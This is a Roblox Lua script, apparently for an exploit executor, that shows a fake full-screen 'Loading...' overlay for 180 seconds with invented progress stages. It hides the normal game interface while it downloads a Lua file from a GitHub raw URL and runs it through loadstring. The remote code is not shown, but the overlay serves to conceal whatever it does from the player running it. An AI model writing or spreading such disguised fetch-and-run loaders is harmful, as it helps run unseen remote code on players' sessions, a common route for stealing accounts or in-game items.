-- SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- GUI SETUP
local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

local robloxIcon = Instance.new("ImageLabel")
robloxIcon.Size = UDim2.new(0, 100, 0, 100)
robloxIcon.Position = UDim2.new(0.5, -50, 0.2, -50)
robloxIcon.BackgroundTransparency = 1
robloxIcon.Image = "rbxassetid://4918373417"
robloxIcon.Parent = background

local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 48
loadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)
loadingText.Parent = background

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 2
stroke.Parent = loadingText

local statusText = Instance.new("TextLabel")
statusText.Text = "Starting..."
statusText.Font = Enum.Font.Gotham
statusText.TextSize = 24
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.BackgroundTransparency = 1
statusText.Size = UDim2.new(1, 0, 0.05, 0)
statusText.Position = UDim2.new(0, 0, 0.49, 0)
statusText.Parent = background

local percentText = Instance.new("TextLabel")
percentText.Text = "0%"
percentText.Font = Enum.Font.Gotham
percentText.TextSize = 36
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.58, 0)
percentText.Parent = background

local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.6, 0, 0.02, 0)
progressBarBg.Position = UDim2.new(0.2, 0, 0.67, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.Parent = background
progressBarBg.ClipsDescendants = true

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBg

local creditText = Instance.new("TextLabel")
creditText.Text = "Made by vakfq"
creditText.Font = Enum.Font.Gotham
creditText.TextSize = 16
creditText.TextColor3 = Color3.fromRGB(255, 255, 255)
creditText.BackgroundTransparency = 1
creditText.Size = UDim2.new(1, 0, 0.05, 0)
creditText.Position = UDim2.new(0, 0, 0.95, 0)
creditText.Parent = background

-- ROTATE ICON
local rotation = 0
local running = true
RunService.RenderStepped:Connect(function(dt)
	if running then
		rotation = rotation + 90 * dt
		robloxIcon.Rotation = rotation % 360
	end
end)

-- ✅ START EXTERNAL SCRIPT IMMEDIATELY
task.spawn(function()
	local url = "https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua"
	local success, response = pcall(function()
		return game:HttpGet(url)
	end)
	if success then
		local fn, loadErr = loadstring(response)
		if fn then
			pcall(fn)
		else
			warn("Loadstring error:", loadErr)
		end
	else
		warn("HttpGet error:", response)
	end
end)

-- LOADING LOOP: 180 SECONDS
task.spawn(function()
	local totalTime = 180
	local steps = 100
	local delayPerStep = totalTime / steps

	for i = 0, steps do
		local percent = i
		percentText.Text = percent .. "%"

		-- Animate bar
		TweenService:Create(progressBar, TweenInfo.new(delayPerStep, Enum.EasingStyle.Linear), {
			Size = UDim2.new(i / 100, 0, 1, 0)
		}):Play()

		-- Status stages
		if percent < 25 then
			statusText.Text = "Loading assets..."
		elseif percent < 50 then
			statusText.Text = "Loading player..."
		elseif percent < 75 then
			statusText.Text = "Loading world..."
		elseif percent < 100 then
			statusText.Text = "Finalizing..."
		else
			statusText.Text = "Done!"
		end

		wait(delayPerStep)
	end

	-- FADE OUT
	for i = 1, 10 do
		local t = i / 10
		background.BackgroundTransparency = t
		loadingText.TextTransparency = t
		statusText.TextTransparency = t
		percentText.TextTransparency = t
		stroke.Transparency = t
		robloxIcon.ImageTransparency = t
		progressBar.BackgroundTransparency = t
		progressBarBg.BackgroundTransparency = t
		creditText.TextTransparency = t
		wait(0.05)
	end

	running = false
	screenGui:Destroy()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)
